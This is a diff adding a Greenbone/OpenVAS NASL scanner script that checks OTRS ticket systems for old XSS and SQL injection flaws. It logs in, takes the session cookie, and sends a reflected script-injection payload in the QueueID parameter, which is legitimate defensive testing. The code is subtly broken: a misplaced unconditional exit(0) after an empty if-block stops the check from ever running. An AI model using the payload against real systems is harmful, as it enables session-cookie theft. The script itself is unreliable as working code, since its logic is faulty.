@@ -1,0 +1,85 @@
+CPE = "cpe:/a:otrs:otrs";
+if(description){
+	script_oid( "1.3.6.1.4.1.25623.1.0.803935" );
+	script_version( "2020-05-08T08:34:44+0000" );
+	script_cve_id( "CVE-2005-3893", "CVE-2005-3894", "CVE-2005-3895" );
+	script_bugtraq_id( 15537 );
+	script_tag( name: "cvss_base", value: "7.5" );
+	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
+	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
+	script_tag( name: "creation_date", value: "2013-09-25 15:32:50 +0530 (Wed, 25 Sep 2013)" );
+	script_name( "OTRS Multiple Input Validation Vulnerabilities" );
+	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to steal the victim's
+  cookie-based authentication credentials or execute arbitrary SQL commands and bypass authentication." );
+	script_tag( name: "vuldetect", value: "Tries to login with provided credentials and sends a crafted HTTP
+  GET request to check if it is possible to conduct an XSS attack." );
+	script_tag( name: "insight", value: "Multiple error exists in the application which fails to validate below user-supplied
+  input's properly:
+
+  For XSS attack (1) QueueID parameter and (2) Action parameters (3) AttachmentDownloadType.
+
+  For SQL attack (1) user parameter (2) TicketID and (3) ArticleID parameters." );
+	script_tag( name: "solution", value: "Upgrade to OTRS (Open Ticket Request System) version 1.3.3 or 2.0.4 or later." );
+	script_tag( name: "solution_type", value: "VendorFix" );
+	script_tag( name: "summary", value: "This host is installed with OTRS (Open Ticket Request System) and is prone to
+  multiple input validation vulnerabilities." );
+	script_tag( name: "affected", value: "OTRS (Open Ticket Request System) version 1.0.0 through 1.3.2 and 2.0.0
+  through 2.0.3." );
+	script_xref( name: "URL", value: "http://secunia.com/advisories/17685" );
+	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/15537" );
+	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/34164" );
+	script_xref( name: "URL", value: "http://www.otrs.com/en/open-source/community-news/security-advisories/security-advisory-2005-01/" );
+	script_category( ACT_ATTACK );
+	script_tag( name: "qod_type", value: "remote_vul" );
+	script_family( "Web application abuses" );
+	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
+	script_dependencies( "logins.sc", "secpod_otrs_detect.sc" );
+	script_require_ports( "Services/www", 80 );
+	script_mandatory_keys( "OTRS/installed", "http/login" );
+	exit( 0 );
+}
+require("url_func.inc.sc");
+require("http_func.inc.sc");
+require("http_keepalive.inc.sc");
+require("host_details.inc.sc");
+func get_otrs_login_cookie( location, otrsport, otrshost ){
+	url = location + "/index.pl?";
+	username = urlencode( str: get_kb_item( "http/login" ) );
+	password = urlencode( str: get_kb_item( "http/password" ) );
+	payload = "Action=Login&RequestedURL=&Lang=en&TimeOffset=-330&User=" + username + "&Password=" + password;
+	req = NASLString( "POST ", url, " HTTP/1.0\\r\\n", "Host: ", otrshost, " \\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Referer: http://", otrshost, location, "/index.pl\\r\\n", "Connection: keep-alive\\r\\n", "Content-Length: ", strlen( payload ), "\\r\\n\\r\\n", payload );
+	buf = http_keepalive_send_recv( port: otrsport, data: req );
+	if(!buf){
+		exit( 0 );
+	}
+	cookie = eregmatch( pattern: "Set-Cookie: Session=([a-z0-9]+)", string: buf );
+	if(!cookie[1]){
+		exit( 0 );
+	}
+	return cookie[1];
+}
+if(!port = get_app_port( cpe: CPE )){
+	exit( 0 );
+}
+if(!loca = get_app_location( cpe: CPE, port: port )){
+	;
+}
+exit( 0 );
+if(loca == "/"){
+	loca = "";
+}
+host = http_host_name( port: port );
+cookie = get_otrs_login_cookie( location: loca, otrsport: port, otrshost: host );
+if(cookie){
+	url = loca + "/index.pl?QueueID=\"><script>alert(document.cookie)</script>\"";
+	req = NASLString( "GET ", url, " HTTP/1.1\\r\\n", "Host: ", host, " \\r\\n", "Connection: keep-alive\\r\\n", "Cookie: Session=", cookie, "\\r\\n\\r\\n" );
+	res = http_send_recv( port: port, data: req );
+	if(ereg( pattern: "^HTTP/1\\.[01] 200", string: res ) && ContainsString( res, "<script>alert(document.cookie)</script>" ) && ContainsString( res, "Logout" )){
+		report = http_report_vuln_url( port: port, url: url );
+		security_message( port: port, data: report );
+		exit( 0 );
+	}
+	exit( 99 );
+}
+exit( 0 );
+
